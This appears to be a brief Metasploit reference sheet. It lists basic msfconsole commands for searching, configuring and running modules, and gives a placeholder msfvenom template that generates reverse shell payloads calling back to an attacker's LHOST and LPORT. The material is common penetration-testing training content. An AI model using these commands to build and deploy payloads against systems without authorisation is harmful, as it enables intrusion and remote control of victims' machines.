## 🌊 Metasploit Fundamentals

> **Warning:** A standard shell and a Meterpreter session maintain distinct operational capabilities. Validate both listener and reverse shell configurations independently if initial execution fails.

## 🏝️ MSFconsole Operations

Initialize the framework console environment.

```bash
# Launch the primary Metasploit console interface
msfconsole
```
* Tool: MSFconsole

Query the framework database for specific exploits, payloads, or auxiliary modules.

```bash
# Search the framework for target modules using keywords
search <query_string>
```
* Tool: MSFconsole

Display the configurable parameters required for the active module.

```bash
# List environment variables and required settings for the loaded module
show options
```
* Tool: MSFconsole

Assign values to specific module parameters.

```bash
# Define target variables or configuration settings
set <OPTION_NAME> <VALUE>
```
* Tool: MSFconsole

Execute the active module against the configured target.

```bash
# Deploy the exploit or run the auxiliary module
exploit
# The 'run' command functions identically in this context
run
```
* Tool: MSFconsole

## 🐠 MSFvenom Payload Assembly

Generate custom payloads for various architectures and platforms. Common output formats include .exe, .aspx, .sh, .php, and .dll.

```bash
# Generate a customized reverse shell payload and output to a specific file format
msfvenom -p <payload_identifier> LHOST=<local_ip_address> LPORT=<local_listening_port> -f <output_format> -o <target_filename.extension>
```
* Tool: MSFvenom
